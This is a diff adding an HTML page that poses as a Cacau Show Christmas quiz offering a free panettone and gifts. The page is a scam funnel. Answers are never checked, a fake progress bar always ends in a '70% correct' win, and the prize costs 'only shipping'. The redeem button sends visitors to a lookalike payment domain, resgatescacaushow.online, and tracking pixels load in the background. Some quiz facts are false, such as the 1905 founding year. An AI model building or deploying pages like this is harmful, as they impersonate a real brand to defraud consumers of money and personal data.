@@ -1,0 +1,544 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Quiz Fini - Promoção 1 Ano de Produtos</title>
+    <link href="https://fonts.googleapis.com/css?family=Inter" rel="stylesheet">
+    <style>
+        body {
+            font-family: Inter;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            background-color: #ffffff; /* Fundo branco */
+        }
+
+        #header {
+            background-color: #30302b; /* Novo fundo do cabeçalho */
+            width: 100%;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        #header img {
+            width: 150px; /* Tamanho da logo */
+        }
+
+        #header .user-info {
+            display: flex;
+            align-items: center;
+        }
+
+        #header .user-info img {
+            width: 50px;
+            margin-left: 20px;
+        }
+
+        #header .user-info span {
+            font-size: 20px;
+            color: white; /* Nome do usuário em branco */
+            display: flex;
+            align-items: center;
+            margin-left: 10px;
+        }
+
+        #header .user-info span::before {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background-color: white; /* Nome do usuário em branco */
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        #quiz-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            background: #fff;
+            border: 1px solid #E0E0E0;
+            padding: 18px;
+            margin: 20px;
+            gap: 15px;
+            border-radius: 10px 10px 10px 10px;
+        }
+
+        .screen {
+            display: none;
+        }
+
+        .screen.visible {
+            display: block;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        button {
+            background: #30302b;
+            color: #fff;
+            width: 100%;
+            outline: none;
+            border: none;
+            padding: 16px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            font-size: 18px !important;
+            font-weight: 500;
+        }
+
+        button:hover {
+            background-color: #3e2575; /* Cor mais escura ao passar o mouse */
+        }
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .popup-content {
+            background-color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .popup-content img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .popup-content p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .popup-content input {
+            border: 1px solid #EBEBEB;
+            padding: 20px 18px;
+            border-radius: 10px;
+            width: 100%;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .question {
+            font-weight: bold;
+        }
+
+        .option {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .option input {
+            margin-right: 10px;
+        }
+
+        .option label {
+            font-size: 16px;
+        }
+
+        .question-image {
+            width: 100%;
+            max-width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            background: #D9D9D9;
+            border-radius: 22px;
+            width: 100%;
+            height: 28px;
+            position: relative;
+        }
+
+        .progress-bar-inner {
+            content: '';
+            background: #30302b;
+            width: var(--progress, 0%);;
+            height: 28px;
+            border-radius: 22px;
+            position: absolute;
+            left: 0px;
+            top: 0px;
+            color: white;
+            transition: width 1s ease;
+        }
+
+        @media (max-width: 600px) {
+            #header {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                padding: 10px;
+            }
+
+            #header img {
+                width: 100px; /* Tamanho da logo no celular */
+            }
+
+            #header .user-info {
+                margin-left: auto;
+                display: flex;
+                align-items: center;
+            }
+
+            #header .user-info img {
+                width: 40px;
+                margin-left: 10px;
+            }
+
+            #header .user-info span {
+                font-size: 16px;
+            }
+
+            button {
+                font-size: 14px;
+            }
+        }
+
+        .congrats-message {
+            text-align: left;
+            color: green;
+            font-weight: bold;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .congrats-gif {
+            display: block;
+            margin: 0 auto 20px;
+            width: 100px; /* Diminui o tamanho do GIF */
+        }
+
+        .result-text {
+            text-align: left;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+
+        
+
+
+
+        *,
+*:after,
+*:before {
+  box-sizing: border-box;
+}
+
+label {
+  display: flex;
+  cursor: pointer;
+  font-weight: 500;
+  position: relative;
+  overflow: hidden;
+  margin-bottom: 0.375em;
+}
+
+label input {
+  position: absolute;
+  left: -9999px;
+}
+
+label input:checked + span {
+  background-color: #f5e5ff; /* Equivalent of mix(#fff, $primary-color, 84%) */
+}
+
+label input:checked + span:before {
+  box-shadow: inset 0 0 0 0.4375em #30302b; /* $primary-color */
+}
+
+label span {
+  display: flex;
+  align-items: center;
+  padding: 0.375em 0.75em 0.375em 0.375em;
+  border-radius: 99em;
+  transition: 0.25s ease;
+}
+
+label span:hover {
+  background-color: #e5e5ff; /* Equivalent of mix(#fff, $primary-color, 84%) */
+}
+
+label span:before {
+  display: flex;
+  flex-shrink: 0;
+  content: "";
+  background-color: #fff;
+  width: 1.5em;
+  height: 1.5em;
+  border-radius: 50%;
+  margin-right: 0.375em;
+  transition: 0.25s ease;
+  box-shadow: inset 0 0 0 0.125em #30302b; /* $primary-color */
+}
+
+        
+    </style>
+    
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "66d2b104240dd0ff161804ff";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script><script async="" defer="" src="js/pixel_1.js"></script>
+
+<script async="" defer="" src="js/pixel_1_1.js"></script>
+    
+    
+</head>
+<body>
+    <div id="header">
+        <img src="images/logo_cacau_show.svg" alt="Fini">
+        <div class="user-info">
+            <span id="user-name">Conectado - </span>
+            <img src="images/user-icon-on-transparent-background-free-png.png" alt="User Icon">
+        </div>
+    </div>
+
+    <div id="quiz-container">
+        <!-- Tela de Perguntas -->
+        <div id="question-screen" class="screen visible">
+            <img id="question-image" class="question-image" src="" alt="Imagem da Pergunta">
+            <p id="question-number" class="question">Pergunta 1 de 7</p>
+            <p id="question-text" class="question">Texto da Pergunta</p>
+            <div id="options-container">
+                <!-- Opções de resposta serão geradas aqui -->
+            </div>
+            <button id="next-button" onclick="nextQuestion()" style="float: right;">Próxima</button>
+        </div>
+
+        <!-- Tela de Carregamento -->
+        <div id="loading-screen" class="screen hidden">
+            <p>Aguarde, analisando respostas...</p>
+            <div class="progress-bar">
+                <div class="progress-bar-inner" id="progress-bar-inner">0%</div>
+            </div>
+        </div>
+
+      <!-- Tela de Resultado -->
+      <div id="result-screen" class="screen hidden">
+        <p id="congrats-message" class="congrats-message"></p>
+        <img src="images/8986fef7a58272135c7c5d006a312554.gif" alt="Verificado" class="congrats-gif">
+        <p class="result-text">
+          Você acertou incríveis 70% das perguntas, apenas 10% das pessoas
+          conseguem chegar neste resultado. Parabéns! Você desbloqueou Brindes Exclusivos
+          Cacau Show pagando apenas o frete. Clique em resgatar para saber mais!
+        </p>
+        <button id="redeem-button" style="display: block; margin: 0 auto; width: 80%">
+          Resgatar prêmio Cacau Show
+        </button>
+      </div>
+    </div>
+
+
+    <!-- Popup de Boas-vindas -->
+    <div id="welcome-popup" class="popup">
+        <div class="popup-content">
+            <img src="images/cacau-show-2017-logo-225E910441-seeklogo.com.png" alt="Fini">
+            <p><b>Válido somente 1 Resgate por CPF ✅</b></p>
+            <p>Bem vindo ao questionário de Natal da Cacau Show! Responda com atenção todas as perguntas e ganhe um Panetone laCreme Supreme ao Leite!</p>
+            <p><b>Pronto para começar nossa pesquisa?</b></p>
+            <input type="text" id="username-input" placeholder="Digite seu nome">
+            <button onclick="startQuiz()">Começar</button>
+        </div>
+    </div>
+
+    <script>
+        let currentQuestion = 0;
+        let userName = "";
+        const totalQuestions = 7;
+        const questions = [
+        {
+          text: "Qual é o produto mais famoso da Cacau Show?",
+          options: [
+            "Chocolate ao leite",
+            "Biscoitos",
+            "Sorvetes",
+            "Chocolates com avelã",
+          ],
+          answer: 0,
+          image: "https://www.folhadealphaville.com.br/images/articles/12367/b2ap3_large_387850732_700835492075018_2680282389896892693_n.jpg",
+        },
+        {
+          text: "Em que ano a Cacau Show foi fundada?",
+          options: ["1901", "1920", "1905", "1988"],
+          answer: 2,
+          image: "https://www.cacaushow.com.br/on/demandware.static/-/Sites-masterCatalog_CacauShow/default/dw9e662256/large/1003229_2.png",
+        },
+        {
+          text: "Você presentearia alguêm que você ama com presentes Cacau Show?",
+          options: ["Sim", "Não"],
+          answer: 0,
+          image: "https://honestreviews.com.br/wp-content/uploads/2021/06/Cacau-Show-Revisao-11-1-1024x1024.jpg",
+        },
+        {
+          text: "Qual é o sabor mais popular do chocolate Cacau Show?",
+          options: ["Ao leite", "Amêndoas", "Caramelo", "Cereja"],
+          answer: 0,
+          image: "https://mercadoeconsumo.com.br/wp-content/uploads/2021/10/cacau-show-mega-store-sao-bernardo.jpg",
+        },
+        {
+          text: "Em qual campanha famosa a Cacau Show promove sua suavidade?",
+          options: [
+            "Suavidade Alpina",
+            "Leite dos Alpes",
+            "Delícias da Cacau",
+            "Pura Ternura",
+          ],
+          answer: 1,
+          image: "https://i.pinimg.com/originals/87/f5/3e/87f53efdf7f896d3f0d59bcd0183f447.jpg",
+        },
+        {
+          text: "Qual ingrediente é a chave para a suavidade do chocolate Cacau Show?",
+          options: ["Leite Alpino", "Açúcar", "Cacau puro", "Amêndoas"],
+          answer: 0,
+          image: "https://image.isu.pub/221206224136-58afbf56bc64a715dedbcc0b085eacda/jpg/page_1_thumb_large.jpg",
+        },
+        {
+          text: "Quantos sabores diferentes de chocolate Cacau Show existem?",
+          options: ["Mais de 20", "Cerca de 10", "Apenas 5", "Cerca de 15"],
+          answer: 0,
+          image: "https://imgv2-2-f.scribdassets.com/img/document/540693380/original/6a13217988/1730319297?v=1",
+        },
+      ];
+
+      
+        function showPopup() {
+            document.getElementById('welcome-popup').style.display = 'flex';
+        }
+
+        function startQuiz() {
+            userName = document.getElementById('username-input').value;
+            if (userName.trim() === "") {
+                alert("Por favor, digite seu nome.");
+                return;
+            }
+            document.getElementById('user-name').innerText += ' ' + userName;
+            document.getElementById('welcome-popup').style.display = 'none';
+            loadQuestion();
+        }
+
+        function loadQuestion() {
+            const question = questions[currentQuestion];
+            document.getElementById('question-number').innerText = `Pergunta ${currentQuestion + 1} de ${totalQuestions}`;
+            document.getElementById('question-text').innerText = question.text;
+            document.getElementById('question-image').src = question.image;
+            const optionsContainer = document.getElementById('options-container');
+            optionsContainer.innerHTML = '';
+            question.options.forEach((option, index) => {
+                const optionElement = document.createElement('div');
+                optionElement.classList.add('option');
+                optionElement.innerHTML = `
+  <label for="option${index}">
+    <input type="radio" name="option" id="option${index}" value="${index}">
+    <span>${option}</span>
+  </label>
+`;
+
+                optionsContainer.appendChild(optionElement);
+            });
+            if (currentQuestion === totalQuestions - 1) {
+                document.getElementById('next-button').innerText = "Finalizar Quiz";
+                document.getElementById('next-button').setAttribute('onclick', 'finishQuiz()');
+            } else {
+                document.getElementById('next-button').setAttribute('onclick', 'nextQuestion()');
+            }
+        }
+
+        function nextQuestion() {
+            const selectedOption = document.querySelector('input[name="option"]:checked');
+            if (selectedOption) {
+                currentQuestion++;
+                loadQuestion();
+            } else {
+                alert('Por favor, selecione uma resposta.');
+            }
+        }
+
+        function finishQuiz() {
+            const selectedOption = document.querySelector('input[name="option"]:checked');
+            if (selectedOption) {
+                document.getElementById('question-screen').classList.remove('visible');
+                document.getElementById('question-screen').classList.add('hidden');
+                showLoadingScreen();
+            } else {
+                alert('Por favor, selecione uma resposta.');
+            }
+        }
+
+        function showLoadingScreen() {
+            document.getElementById('loading-screen').classList.remove('hidden');
+            document.getElementById('loading-screen').classList.add('visible');
+            let progress = 0;
+            const progressBarInner = document.getElementById('progress-bar-inner');
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBarInner.style.width = progress + '%';
+                progressBarInner.innerText = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    showResultScreen();
+                }
+            }, 70);
+        }
+
+        function showResultScreen() {
+            document.getElementById('loading-screen').classList.remove('visible');
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('result-screen').classList.remove('hidden');
+            document.getElementById('result-screen').classList.add('visible');
+            document.getElementById('congrats-message').innerText = `Parabéns ${userName}!`;
+        }
+
+        document.getElementById('redeem-button').onclick = function() {
+            window.location.href = `https://pay.resgatescacaushow.online/z0qn35qe1kV398m` + window.location.search;
+        };
+    </script>
+
+
+</body></html>
